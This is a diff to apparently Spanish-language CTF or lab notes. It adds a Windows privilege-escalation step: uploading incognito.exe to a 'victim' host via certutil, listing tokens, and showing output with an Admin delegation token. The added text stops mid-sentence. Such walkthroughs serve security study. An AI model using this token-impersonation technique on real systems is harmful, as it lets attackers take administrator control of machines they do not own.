@@ -431,7 +431,58 @@ Cuando obtenemos consola en la maquina si nos fijamos la unidad es la E:\ , que 
 		Audit  : 
 		Sddl   : O:SYG:SYD:PAI(A;OICI;FA;;;S-1-5-21-297466380-2647629429-287235700-1003)
 
-  	
+  -Solo tiene acceso el usuario Admin al directorio, por lo que vamos a intentar una tecnica llamada ---> Token Impersonation.
+
+  	INFO--> [+] https://medium.com/r3d-buck3t/domain-escalation-with-token-impersonation-bc577db55a0f
+
+		
+  -Para realizar esta tecnica utilizaremos 'Incognito.exe' lo subiremos a la maquina victima mediante Certutil como hicimos con netcat y rshell.php
+ 
+  	Link --> [+] https://github.com/FSecureLABS/incognito/blob/394545ffb844afcc18e798737cbd070ff3a4eb29/incognito.exe
+
+  - Listamos Tokens disponibles de usuarios del sistema.
+    
+		PS C:\temp> .\incognito.exe list_tokens -u
+		.\incognito.exe list_tokens -u
+		[*] Enumerating tokens
+		[*] Listing unique users found
+		
+		Delegation Tokens Available
+		============================================
+		NT AUTHORITY\IUSR 
+		NT AUTHORITY\LOCAL SERVICE 
+		NT AUTHORITY\NETWORK SERVICE 
+		NT AUTHORITY\SYSTEM 
+		WIN-8VMBKF3G815\Admin   ----> Tenemos un Token de delegacion del usuario Admin, el que nos interesa.
+		Window Manager\DWM-1 
+		
+		Impersonation Tokens Available
+		============================================
+		NT AUTHORITY\ANONYMOUS LOGON 
+		
+		Administrative Privileges Available
+		============================================
+		SeAssignPrimaryTokenPrivilege
+		SeCreateTokenPrivilege
+		SeTcbPrivilege
+		SeTakeOwnershipPrivilege
+		SeBackupPrivilege
+		SeRestorePrivilege
+		SeDebugPrivilege
+		SeImpersonatePrivilege
+		SeRelabelPrivilege
+		SeLoadDriverPrivilege
+
+	
+	NOTA:
+	Que es un token de Delegacion?
+	El token de delegación se utiliza para permitir que un servicio o proceso actúe en nombre de un usuario autenticado
+	para acceder a recursos en otro servidor. Por lo tanto, su objetivo principal es permitir a un servicio actuar
+	en nombre de un usuario para realizar acciones en su nombre.
+
+  - Executamos un nuevo proceso en es
+
+      		
 
 
 
